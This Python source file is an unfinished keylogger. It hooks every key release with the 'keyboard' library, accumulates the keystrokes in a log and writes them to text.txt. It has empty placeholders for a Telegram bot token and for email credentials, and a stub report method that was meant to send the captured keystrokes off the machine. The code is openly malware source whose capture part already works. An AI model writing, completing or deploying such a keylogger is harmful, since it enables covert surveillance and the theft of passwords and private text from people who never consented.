import keyboard
from contracts import contract, new_contract


SEND_REPORT_EVERY = 60
TELEGRAM_BOT_TOKEN = ""
EMAIL = ""
EMAIL_PASSWORD = ""


@new_contract
def validationCheckReportMethod(s):
    if s not in ("email", "file", "telegram"):
        raise ValueError("report_method can only be one of these three:"
                         "email, telegram, file. Unacceptable %s" % s)


class Keylogger:
    @contract
    def __init__(self, interval=3600, report_method="telegram"):
        """
        :param interval: time interval between reports (in seconds)
        :param report_method: where to send report

        :type interval: int,>0
        :type report_method: str,validationCheckReportMethod
        """
        self.interval = interval
        self.report_method = report_method
        self.log = ""

    @contract
    def callback(self, event):  # TODO: tracking keys
        """
        This method ...
        """
        name = event.name
        if len(name) > 1:
            pass
        self.log += name

    def report_to_file(self):
        """
        This method ...
        """
        with open("text.txt", "w") as file:
            print(self.log, file=file)

    def report(self):
        pass

    def start(self):
        """
        This method ...
        """
        keyboard.on_release(callback=self.callback)
        keyboard.wait()


def main():
    """
    """
    keylogger = Keylogger(SEND_REPORT_EVERY, "email")
    keylogger.start()


if __name__ == "__main__":
    main()
